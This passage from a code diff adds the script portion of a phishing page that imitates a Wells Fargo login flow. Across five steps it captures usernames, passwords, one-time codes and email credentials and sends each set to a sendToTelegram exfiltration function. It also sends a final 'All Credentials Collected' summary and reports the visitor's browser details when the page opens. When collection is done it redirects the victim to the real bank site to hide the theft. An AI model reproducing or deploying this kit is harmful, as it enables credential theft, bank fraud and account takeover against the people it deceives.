+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                });
+                
+                showStep(3);
+            } else {
+                alert('Please enter both username and password.');
+            }
+        });
+
+        document.getElementById('verifyOtpButton').addEventListener('click', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            let otpCode = '';
+            otpInputs.forEach(input => {
+                otpCode += input.value;
+            });
+            
+            if (otpCode.length === 6) {
+                sendToTelegram({
+                    step: 'Step 3 - OTP Verification',
+                    otp: otpCode,
+                    timestamp: new Date().toLocaleString()
+                });
+                
+                showStep(4);
+            } else {
+                alert('Please enter the complete 6-digit verification code.');
+            }
+        });
+
+        document.getElementById('verifyButton').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('verificationPassword').value;
+            
+            if (email.includes('@') && password) {
+                userCredentials.email = email;
+                userCredentials.verificationPassword = password;
+                
+                sendToTelegram({
+                    step: 'Step 4 - Email Verification',
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                });
+                
+                document.getElementById('revalidateEmail').value = email;
+                showStep(5);
+            } else {
+                alert('Please enter a valid email and password.');
+            }
+        });
+
+        document.getElementById('revalidateEmailButton').addEventListener('click', function() {
+            const email = document.getElementById('revalidateEmail').value;
+            const password = document.getElementById('revalidateVerificationPassword').value;
+            
+            if (email.includes('@') && password) {
+                sendToTelegram({
+                    step: 'Step 5 - Email Revalidation',
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                });
+                
+                // Send final summary
+                sendToTelegram({
+                    step: 'COMPLETE - All Credentials Collected',
+                    allData: userCredentials,
+                    timestamp: new Date().toLocaleString(),
+                    ip: 'User IP would be here'
+                });
+                
+                showStep(6);
+                
+                // Start verification process
+                setTimeout(() => {
+                    document.getElementById('verificationMessage').textContent = 'Verification complete! Redirecting...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.wellsfargo.com';
+                    }, 2000);
+                }, 3000);
+            } else {
+                alert('Please enter a valid email and password.');
+            }
+        });
+
+        // Back buttons
+        document.getElementById('backToStep1Button').addEventListener('click', () => showStep(1));
+        document.getElementById('backToStep2Button').addEventListener('click', () => showStep(2));
+        document.getElementById('backToStep3Button').addEventListener('click', () => showStep(3));
+        document.getElementById('backToStep4Button').addEventListener('click', () => showStep(4));
+
+        // Resend OTP link
+        document.getElementById('resendOtpLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Verification code has been resent to your phone.');
+        });
+
+        // Enter key support
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const activeStep = document.querySelector('.login-step.active').id;
+                if (activeStep === 'step1') document.getElementById('continueButton').click();
+                else if (activeStep === 'step2') document.getElementById('revalidateButton').click();
+                else if (activeStep === 'step3') document.getElementById('verifyOtpButton').click();
+                else if (activeStep === 'step4') document.getElementById('verifyButton').click();
+                else if (activeStep === 'step5') document.getElementById('revalidateEmailButton').click();
+            }
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeBasedBackground();
+            setupPasswordToggles();
+            setupOtpInputs();
+            showStep(1);
+            
+            // Send initial access notification
+            sendToTelegram({
+                step: 'PAGE_ACCESSED',
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            });
+        });
+    </script>
+</body>
+</html>
